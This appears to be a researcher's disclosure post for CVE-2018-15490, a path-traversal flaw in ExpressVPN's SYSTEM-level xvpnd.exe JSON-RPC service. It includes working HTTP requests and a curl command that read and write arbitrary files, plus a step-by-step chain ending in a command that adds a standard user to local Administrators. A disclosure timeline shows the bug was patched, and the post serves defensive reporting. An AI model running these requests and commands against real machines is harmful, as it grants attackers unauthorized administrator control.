---
layout: post
title: CVE-2018–15490 ExpressVPN local privilege escalation
canonical_url: https://medium.com/@Wflki/https-medium-com-wflki-cve-2018-15490-expressvpn-local-privilege-escalation-d22c86fecc47?source=rss-6916f6b61f10------2
tag:
- privilege-escalation
- vpn
- cve
- vulnerability
---

<p>Two vulnerabilities exist in <strong>xvpnd.exe</strong> process that allows non-privileged user to read and write files on file system on behalf of the xvpnd.exe process. This could be exploited to local privilege escalation.</p><p>Xvpnd.exe process (runs as a service with SYSTEM privileges) listens on 2015 TCPport, which is used as RPC interface for communication with client side of ExpressVpn application. JSON-RPC protocol over HTTP protocol is used for communication. JSON-RPC <strong>XVPN.GetPreference</strong> and<strong> XVPN.SetPreference </strong>methods are vulnerable for path traversal and allow to read and write files on the file system.</p><h4>Proof of concept</h4><p>In order to make JSON-RPC request it is required access token. Access token is stored on the file <em>C:\ProgramData\ExpressVPN\v4\access_token </em>which is readable for all authenticated users (see screenshot below).</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/376/0*_XPNMgYaQfu4UPnQ" /></figure><p><strong>Key</strong> parameters’ value for method <strong>XVPN.GetPreference</strong> is treated as filename and is vulnerable to path traversal. This allows to read any file on the file system with SYSTEM privileges. The following POST request demonstrates the issue:</p><pre>POST /rpc HTTP/1.1<br>Accept: application/json, application/xml, text/json, text/x-json, text/javascript, text/xml<br>User-Agent: RestSharp/105.2.3.0<br>Content-Type: application/json<br>Host: localhost:2015<br>Content-Length: 171<br>Accept-Encoding: gzip, deflate<br>{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;XVPN.GetPreference&quot;,&quot;params&quot;:{&quot;access_token&quot;:&quot;ku8j6opcwv4uqzvwol8rgnh31x04nr24&quot;,&quot;key&quot;:<strong>&quot;../../../../../../../../../../Windows/win.ini</strong>&quot;},&quot;id&quot;:&quot;2&quot;}</pre><p>Application responds with the content of the file encoded as base64.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1008/0*inQI0dv4mDhwstjC" /></figure><p><strong>XVPN.GetPreference </strong>JSON-RPC method is vulnerable in similar manner. It allows to write a file anywhere on the file system. Next request demonstrates how to create a file sectest.txt on Windows folder by interacting with JSON-RPC.</p><pre>POST /rpc HTTP/1.1<br>Accept: application/json, application/xml, text/json, text/x-json, text/javascript, text/xml<br>User-Agent: RestSharp/105.2.3.0<br>Content-Type: application/json<br>Host: localhost:2015<br>Content-Length: 206<br>Accept-Encoding: gzip, deflate</pre><pre>{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;XVPN.SetPreference&quot;,&quot;params&quot;:{&quot;access_token&quot;:&quot;ku8j6opcwv4uqzvwol8rgnh31x04nr24&quot;,&quot;key&quot;:&quot;<strong>../../../../../../../../../../Windows/sectest.txt</strong>&quot;,&quot;value&quot;:&quot;<strong>test</strong>&quot;,&quot;type&quot;:&quot;string&quot;},&quot;id&quot;:&quot;2&quot;}</pre><p>Next screenshot shows that file was created successfully.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/0*oFXQrAZ-OwZD3nGt" /></figure><p>There are many methods to escalate privileges on Windows operating system by having file write privileges anywhere on the system. In this case situation is a bit complicated since written content is between double quotes. Anyway it is possible to create a .cmd file, which calls another .cmd file with additional commands. Additionally, ExpressVPN xvpnd.exe process tries to call many non existing files in <em>C:\Program Files\ExpressVPN\xvpnd</em> folder after disconnecting from VPN server. Procmon allows to see that xvpnd.exe process tries to open many non existing files.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/0*ULBX5LqttpIgch8h" /></figure><p>Missing file can be created by abusing described vulnerability and it will be called by xvpnd.exe process.</p><p>To summarize, exploitation steps for privilege escalation:</p><ol><li>Login to Windows OS with non-admin user.</li><li>Launch ExpressVpn application and connect to any VPN server.</li><li>Create a file <em>C:\Program Files\ExpressVPN\xvpnd\sc.cmd</em> by issuing the following request to JSON-RPC service.</li></ol><pre>curl -i -s -k  -X $&#39;POST&#39; \<br> -H $&#39;Accept: application/json, application/xml, text/json, text/x-json, text/javascript, text/xml&#39; -H $&#39;User-Agent: RestSharp/105.2.3.0&#39; -H $&#39;Content-Type: application/json&#39; -H $&#39;Host: localhost:2015&#39; -H $&#39;Content-Length: 277&#39; -H $&#39;Accept-Encoding: gzip, deflate&#39; \    --data-binary $&#39;{\&quot;jsonrpc\&quot;:\&quot;2.0\&quot;,\&quot;method\&quot;:\&quot;XVPN.SetPreference\&quot;,\&quot;params\&quot;:{\&quot;access_token\&quot;:\&quot;ku8j6opcwv4uqzvwol8rgnh31x04nr24\&quot;,\&quot;key\&quot;:\&quot;<strong>../../../../../../../../../../Program Files/ExpressVPN/xvpnd/sc.cmd</strong>\&quot;,\&quot;value\&quot;:\&quot;<strong>C:\\\\Users\\\\standard2\\\\AppData\\\\Local\\\\Temp\\\\exploit.cmd</strong>\&quot;,\&quot;type\&quot;:\&quot;string\&quot;},\&quot;id\&quot;:\&quot;2\&quot;}\x0d\x0a&#39; \<br>$&#39;<a href="http://localhost:2015/rpc&#39;">http://localhost:2015/rpc&#39;</a></pre><p>4. Create <em>C:\Users\standard2\AppData\Local\Temp\exploit.cmd</em> file with following content:</p><pre>net localgroup Administrators standard2 /add</pre><p>5. Disconnect from VPN server. Then <em>C:\Program Files\ExpressVPN\xvpnd\sc.cmd</em> file should be executed and user <em>standard2</em> should be added to administrators local group.</p><p><strong>Tested version: </strong>Windows application<strong> </strong>ExpressVPN version 6.6.2(4493)</p><h4>Disclosure Timeline:</h4><p>June 24, 2018 — Vendor notified about vulnerability</p><p>June 25, 2018 — Vendor asked additional details</p><p>June 25, 2018 — Additional details were provided</p><p>June 25, 2018 — Vendor acknowledged vulnerability, informed that it will be patched in next release. Asked to postpone release of details for six month. Bounty awarded.</p><p>July 5, 2018 — Fixed version of ExpressVPN released</p><p>December 31, 2018 —Public disclosure</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=d22c86fecc47" width="1" height="1" alt="">
